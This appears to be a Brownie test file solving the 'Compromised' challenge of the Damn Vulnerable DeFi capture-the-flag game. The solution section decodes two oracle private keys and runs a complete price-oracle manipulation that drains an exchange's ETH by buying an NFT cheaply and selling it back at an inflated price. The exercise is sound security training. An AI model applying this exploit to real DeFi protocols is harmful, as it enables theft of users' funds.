from brownie import (accounts, Wei, Exchange,
                     TrustfulOracle, TrustfulOracleInitializer, DamnValuableNFT)


# This challenge contains additional data in the description: https://www.damnvulnerabledefi.xyz/challenges/7.html

def test_compromised():

    # ** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE **

    sources = [
        '0xA73209FB1a42495120166736362A1DfA9F95A105',
        '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
        '0x81A5D6E50C214044bE44cA0CB057fe119097850c']

    deployer, attacker = accounts[0:2]

    # <-- make sure to set ganache --defaultBalanceEther high enough!
    EXCHANGE_INITIAL_ETH_BALANCE = Wei('9990 ether')
    INITIAL_NFT_PRICE = Wei('999 ether')

    oracle_initializer = TrustfulOracleInitializer.deploy(sources, ["DVNFT", "DVNFT", "DVNFT"], [
                                                          INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE], {"from": deployer})
    # oracle got deployed by the initializer, grab ABI and address:
    oracle = TrustfulOracle.at(oracle_initializer.oracle())

    # give attacker only the 0.1ETH starting balance, by transferring excess amounts away (don't know a better way to specify balance in ganache)
    initial_balance = attacker.balance()
    attacker.transfer(accounts[9], initial_balance - Wei("0.1 ether"))
    assert attacker.balance() == Wei("0.1 ether")

    # deploy exchange and get associated token contract
    exchange = Exchange.deploy(
        oracle.address, {"from": deployer, "value": EXCHANGE_INITIAL_ETH_BALANCE})
    token = DamnValuableNFT.at(exchange.token())

    # ** CODE YOUR EXPLOIT HERE **

    """
    SOLUTION:
    We can paste the hexadecimals provided in the exercise into: https://www.asciitohex.com/
    It yields some weird text, which itself is base64 encoded (we can see that because it contains letters like W,Q,T,Z..)
    Thus by copying that ascii text into the Base64 field of the same site, we now receive an address 0x.... in the text field.
    --> these are two private keys of the oracles.
    """
    key1 = "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9"
    key2 = "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48"

    # create two wallet accounts with these keys
    trust1 = accounts.add(key1)
    trust2 = accounts.add(key2)

    # Since the NFT price is the median out of 3 trusted sources, we can completely control it.

    # 1. Set NFT price to zero using two of the trusted sources
    oracle.postPrice("DVNFT", 0, {"from": trust1})
    oracle.postPrice("DVNFT", 0, {"from": trust2})

    # 2. Buy an NFT at the discounted price
    tx = exchange.buyOne({"value": Wei("0.1 ether"), "from": attacker})
    token_id = tx.events["TokenBought"]["tokenId"]
    assert token.ownerOf(token_id) == attacker

    # 3. Set NFT Price to the balance of the exchange
    oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE, {"from": trust1})
    oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE, {"from": trust2})

    # 4. Sell our NFT for the high price
    token.approve(exchange.address, token_id, {"from": attacker})
    exchange.sellOne(token_id, {"from": attacker})

    # 5. Reset NFT price to original
    oracle.postPrice("DVNFT", INITIAL_NFT_PRICE, {"from": trust1})
    oracle.postPrice("DVNFT", INITIAL_NFT_PRICE, {"from": trust2})

    # ** SUCCESS CONDITIONS **
    # attacker must have received all the exchange funds
    assert attacker.balance() == EXCHANGE_INITIAL_ETH_BALANCE + Wei("0.1 ether")
    # attacker shouldn't have any NFT anymore
    assert token.balanceOf(attacker) == 0
    # oracle price should not have changed
    assert oracle.getMedianPrice("DVNFT") == INITIAL_NFT_PRICE
